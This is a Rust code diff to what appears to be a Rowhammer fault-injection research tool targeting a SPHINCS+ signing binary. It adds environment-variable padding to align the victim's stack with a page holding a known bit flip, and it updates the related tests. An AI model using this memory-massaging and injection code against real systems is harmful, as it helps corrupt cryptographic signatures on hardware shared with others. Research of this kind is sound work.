@@ -1,9 +1,8 @@
-use itertools::Itertools;
+use anyhow::{bail, Context};
 use libc::sched_getcpu;
 use serde::Serialize;
 use sha2::{Digest, Sha256};
 use std::{
-    arch::x86_64::_mm_clflush,
     collections::HashMap,
     io::{BufRead, BufReader},
     thread,
@@ -21,6 +20,7 @@ use super::{HammerVictim, HammerVictimError, InjectionConfig, PageInjector, Vict
 enum State {
     Init {
         binary: String,
+        env: Vec<(String, String)>,
         injection_config: InjectionConfig,
     },
     Running {
@@ -101,31 +101,6 @@ pub struct TargetOffset {
     stack_offset: usize,
     pub target_size: usize,
     pub flip_direction: FlipDirection,
-}
-
-fn filter_addrs(flips: Vec<BitFlip>, targets: &[TargetOffset]) -> Vec<(usize, TargetOffset)> {
-    flips
-        .into_iter()
-        .filter_map(|flip| {
-            let flipped_bits = flip.data & flip.bitmask;
-            let addr = flip.addr;
-            let pg_offset = addr & 0xfff;
-            let matched = targets.iter().find(|&target| {
-                let direction_match = match target.flip_direction {
-                    FlipDirection::ZeroToOne => flipped_bits == 0,
-                    FlipDirection::OneToZero => flipped_bits == flip.bitmask,
-                    FlipDirection::Any => true,
-                    FlipDirection::None | FlipDirection::Multiple(_) => unimplemented!(),
-                };
-                let addr = target.page_offset & 0xfff;
-                direction_match && addr <= pg_offset && pg_offset < addr + target.target_size
-            });
-            if matched.is_some() {
-                info!("Matched addr 0x{:x} to target {:?}", addr, matched);
-            }
-            matched.map(|offset| (addr, offset.clone()))
-        })
-        .collect_vec()
 }
 
 const _TARGET_OFFSETS_ANY: [TargetOffset; 1] = [TargetOffset {
@@ -227,45 +202,51 @@ pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 10] = [
     },
 ];
 
-fn find_injectable_page(flips: Vec<BitFlip>) -> Option<InjectionConfig> {
-    // the number of bait pages to release after the target page (for memory massaging)
-    let bait_count_after = HashMap::from([(32, 1), (30, 22)]);
-
-    filter_addrs(flips, &_TARGET_OFFSETS_ANY)
-        .first()
-        .map(|f| InjectionConfig {
-            id: f.1.id,
-            target_addr: f.0,
-            flippy_page_size: PAGE_SIZE,
-            bait_count_after: bait_count_after
-                .get(&f.1.stack_offset)
-                .copied()
-                .expect("unsupported stack offset"),
-            bait_count_before: 0,
-            stack_offset: f.1.stack_offset,
-        })
-}
-
 impl SphincsPlus {
     /// Create a new `SphincsPlus` victim.
-    ///
-    /// # Arguments
-    /// - `binary`: The path to the target binary.
-    /// - `keys_path`: The path to the keys.
-    /// - `sigs_path`: The output path to the signatures.
-    /// - `injection_config`: The injection configuration.
-    pub fn new(
-        binary: String,
-        flips: Vec<BitFlip>,
-        memory: &dyn VictimMemory,
-    ) -> anyhow::Result<Self> {
-        let injection_config = find_injectable_page(flips)
-            .ok_or_else(|| anyhow::anyhow!("No page suitable for injection found"))?;
+    pub fn new(binary: String, flip: BitFlip, memory: &dyn VictimMemory) -> anyhow::Result<Self> {
+        let bait_count_after = HashMap::from([(32, 1), (31, 4), (30, 22)]); // TODO stabilitze bait count after for stack inejction w/ env
+        let target = if flip.flip_direction() == FlipDirection::ZeroToOne {
+            TARGET_OFFSETS_SHAKE_256S[9].clone()
+        } else {
+            TARGET_OFFSETS_SHAKE_256S[7].clone()
+        };
+        if target.page_offset < flip.addr & PAGE_MASK {
+            bail!("Target offset is less than flip address, not implemented yet.");
+        }
+        let (env, page_overflow) = make_env_for(flip.addr, target.page_offset);
+        let stack_offset = if page_overflow {
+            target.stack_offset - 1
+        } else {
+            target.stack_offset
+        };
+
+        assert_eq!(flip.flip_direction(), target.flip_direction);
+
+        let bait_count_after = *bait_count_after
+            .get(&stack_offset)
+            .with_context(|| format!("unsupported stack offset {}", stack_offset))
+            .unwrap();
+
+        info!(
+            "Using stack offset {} and bait count after {}",
+            stack_offset, bait_count_after
+        );
+
+        let injection_config = InjectionConfig {
+            id: target.id,
+            target_addr: flip.addr & !(PAGE_MASK),
+            flippy_page_size: PAGE_SIZE,
+            bait_count_after,
+            bait_count_before: 0,
+            stack_offset,
+        };
         let flush_lines = Self::make_flush_lines(injection_config, memory);
         Ok(Self {
             state: State::Init {
                 binary,
                 injection_config,
+                env: vec![(env, String::new())],
             },
             flush_lines,
         })
@@ -289,16 +270,35 @@ impl SphincsPlus {
         binary: String,
         injection_config: InjectionConfig,
         memory: &dyn VictimMemory,
+        env: Vec<(String, String)>,
     ) -> anyhow::Result<Self> {
         let flush_lines = Self::make_flush_lines(injection_config, memory);
         Ok(Self {
             state: State::Init {
                 binary,
                 injection_config,
+                env,
             },
             flush_lines,
         })
     }
+}
+
+fn make_env_for(flippy_addr: usize, target_offset: usize) -> (String, bool) {
+    let flippy_offset = flippy_addr & PAGE_MASK;
+    let target_offset = target_offset & PAGE_MASK;
+    let overflow = target_offset < flippy_offset;
+    let target_offset = if overflow {
+        target_offset + PAGE_SIZE - 1
+    } else {
+        target_offset
+    };
+    let offset = target_offset - flippy_offset;
+    info!(target: "env_fixer",
+        "flippy_offset: 0x{:x}, target_offset: 0x{:x}, offset: 0x{:x}",
+        flippy_offset, target_offset, offset
+    );
+    ("A".repeat(offset), overflow) // if target_offset < flippy_offset, we overflow a page boundary and have to subtract 1 from the region offset
 }
 
 impl HammerVictim for SphincsPlus {
@@ -307,6 +307,7 @@ impl HammerVictim for SphincsPlus {
             State::Init {
                 binary,
                 injection_config,
+                env,
             } => {
                 set_process_affinity(unsafe { libc::getpid() }, get_current_core());
                 let mut cmd = std::process::Command::new(binary);
@@ -316,6 +317,7 @@ impl HammerVictim for SphincsPlus {
                 cmd.stdout(std::process::Stdio::piped());
                 cmd.stderr(std::process::Stdio::piped());
                 cmd.env_clear();
+                cmd.envs(env.iter().cloned());
                 let page_injector = PageInjector::new(*injection_config);
                 let target_pfn = (injection_config.target_addr as *const libc::c_void)
                     .pfn()
@@ -501,7 +503,7 @@ mod tests {
         memory::{BitFlip, ConsecBlocks, MemBlock},
         util::PAGE_SIZE,
         victim::{
-            sphincs_plus::{self, filter_addrs, TargetOffset},
+            sphincs_plus::{self, TargetOffset},
             HammerVictim,
         },
     };
@@ -513,7 +515,7 @@ mod tests {
         let flip = BitFlip::new(ptr, 0x1, 0x1);
         let mut stack_process = super::SphincsPlus::new(
             "/home/jb/sphincsplus/ref/test/server".to_string(),
-            vec![flip],
+            flip,
             &mem,
         )?;
         for _ in 0..10 {
@@ -529,47 +531,15 @@ mod tests {
     }
 
     #[test]
-    fn test_filter_addrs_match_start() {
-        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
-        let targets = [TargetOffset {
-            id: usize::MAX,
-            description: "test_filter_flips_match_start",
-            page_offset: 0x700,
-            stack_offset: 31,
-            target_size: 32,
-            flip_direction: sphincs_plus::FlipDirection::Any,
-        }];
-        let filtered = filter_addrs(vec![flip], &targets);
-        assert_eq!(filtered.len(), 1);
-    }
-
-    #[test]
-    fn test_filter_addrs_match_end() {
-        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
-        let target = TargetOffset {
-            id: usize::MAX,
-            description: "test_filter_flips_match_end",
-            page_offset: 0x600,
-            stack_offset: 31,
-            target_size: 0x101,
-            flip_direction: sphincs_plus::FlipDirection::Any,
-        };
-        let filtered = filter_addrs(vec![flip], &[target]);
-        assert_eq!(filtered.len(), 1);
-    }
-
-    #[test]
-    fn test_filter_addrs_nomatch() {
-        let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
-        let target = TargetOffset {
-            id: usize::MAX,
-            description: "test_filter_flips_nomatch",
-            page_offset: 0x600,
-            stack_offset: 31,
-            target_size: 0x100,
-            flip_direction: sphincs_plus::FlipDirection::Any,
-        };
-        let filtered = filter_addrs(vec![flip], &[target]);
-        assert_eq!(filtered.len(), 0);
+    fn test_make_env_for() {
+        let (env, overflow) = super::make_env_for(0x420, 0x630);
+        assert_eq!(env.len(), 0x210, "target_offset > flippy_addr");
+        assert!(!overflow, "target_offset > flippy_addr");
+        let (env, overflow) = super::make_env_for(0x630, 0x420);
+        assert_eq!(env.len(), 0xdef, "target_offset < flippy_addr");
+        assert!(overflow, "target_offset < flippy_addr");
+        let (env, overflow) = super::make_env_for(0x630, 0x630);
+        assert_eq!(env.len(), 0, "target_offset == flippy_addr");
+        assert!(!overflow, "target_offset == flippy_addr");
     }
 }
